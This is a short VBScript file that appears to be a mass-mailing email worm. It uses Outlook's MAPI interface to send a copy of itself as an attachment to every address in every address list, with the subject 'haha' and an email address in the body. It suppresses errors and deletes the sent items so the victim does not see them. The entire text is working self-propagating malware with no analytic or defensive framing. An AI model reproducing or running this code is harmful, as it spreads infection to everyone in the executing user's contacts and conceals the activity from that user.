On Error Resume Next
Dim OL01, OL02, OL03, OL04, OL05
Set OL01 = CreateObject( "Outlook.Application" )
Set OL02 = OL01.GetNameSpace( "MAPI" )
For Each OL03 In OL02.AddressLists
For OL04 = 1 To OL03.AddressEntries.Count
Set OL05 = OL01.CreateItem( 0 )
OL05.BCC = OL03.AddressEntries( OL04 ).Address
OL05.Subject = "haha"
OL05.Body = "marcel.maez@t-online.de"
OL05.Attachments.Add WScript.ScriptFullName
OL05.DeleteAfterSubmit = True
OL05.Send
Next
Next